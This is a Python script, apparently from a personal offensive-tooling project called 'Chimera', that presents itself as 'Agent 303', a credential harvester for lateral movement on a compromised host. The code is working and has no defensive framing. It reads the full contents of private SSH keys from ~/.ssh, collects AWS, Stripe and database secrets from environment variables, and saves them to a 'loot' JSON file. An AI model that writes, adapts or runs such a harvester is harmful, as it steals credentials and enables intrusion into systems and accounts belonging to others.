#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import json
import re
from datetime import datetime

class IdentityStealer:
    """
    Agent 303: Lateral Movement Credential Harvester.
    Scans the compromised host for SSH keys, config files, 
    and environment variables that facilitate moving to the next target.
    """
    def __init__(self):
        self.loot_dir = "/home/dan/Chimera_Project/agents/303_Identity_Stealer/loot"
        os.makedirs(self.loot_dir, exist_ok=True)
        self.findings = []

    def scan_ssh_keys(self):
        """Searches for private SSH keys in common locations."""
        print("[*] Hunting for SSH Private Keys...")
        ssh_path = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_path):
            for file in os.listdir(ssh_path):
                if "id_rsa" in file or "id_ed25519" in file:
                    if not file.endswith(".pub"):
                        path = os.path.join(ssh_path, file)
                        with open(path, 'r') as f:
                            self.findings.append({
                                "type": "SSH_PRIVATE_KEY",
                                "name": file,
                                "content": f.read()
                            })
                            print(f"    [!!!] FOUND: {file}")

    def scan_env_vars(self):
        """Checks environment variables for AWS/Cloud keys."""
        print("[*] Checking Environment Variables for Cloud Secrets...")
        keys_to_watch = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "STRIPE_KEY", "DB_PASSWORD"]
        for key in keys_to_watch:
            val = os.environ.get(key)
            if val:
                self.findings.append({"type": "ENV_VAR", "name": key, "content": val})
                print(f"    [!!!] FOUND: {key}")

    def execute(self):
        print("--- [AGENT 303: IDENTITY STEALER ACTIVE] ---")
        self.scan_ssh_keys()
        self.scan_env_vars()

        # Commit to Loot
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = f"{self.loot_dir}/identities_{timestamp}.json"
        with open(loot_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
            
        print(f"[!!!] HARVEST COMPLETE. {len(self.findings)} CREDENTIALS STORED AT: {loot_file}")

if __name__ == "__main__":
    IdentityStealer().execute()
